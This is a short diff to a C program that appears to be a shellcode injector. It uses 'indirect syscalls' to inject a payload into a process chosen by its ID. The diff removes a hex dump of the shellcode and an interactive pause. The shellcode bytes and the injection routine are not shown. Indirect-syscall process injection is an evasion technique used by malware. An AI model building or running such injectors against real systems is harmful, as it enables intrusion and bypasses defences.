@@ -40,28 +40,10 @@ int main(int argc, char* argv[])
         return -1;
     }
 
-    printf("[!!!] Initiating (Indirect Syscalls) SKID Launcher!\n");
-
-
-    for (int i = 0; i < sizeof(Shellcode); i++)
-    {
-        if (i % 16 == 0)
-        {
-            printf("\n ");
-        }
-        Sleep(1);
-        printf(" %02x", Shellcode[i]);
-    }
-    puts("\n");
-
 
     size_t sc_size = sizeof(Shellcode);
     INFO("Current Shellcode Address: %p", &Shellcode);
     INFO("Shellcode size: %zu bytes", sc_size);
-
-
-    CHAR("Inject Payload!\n");
-    getchar();
 
 
     if (!IndirectShellInjection(atoi(argv[1]), Shellcode, sc_size))
@@ -70,6 +52,6 @@ int main(int argc, char* argv[])
         return -1;
     }
 
-    OKAY("successfully injected process with Indirect Syscalls!!");
+    OKAY("successfully injected process with Indirect Syscalls!");
     return EXIT_SUCCESS;
 }
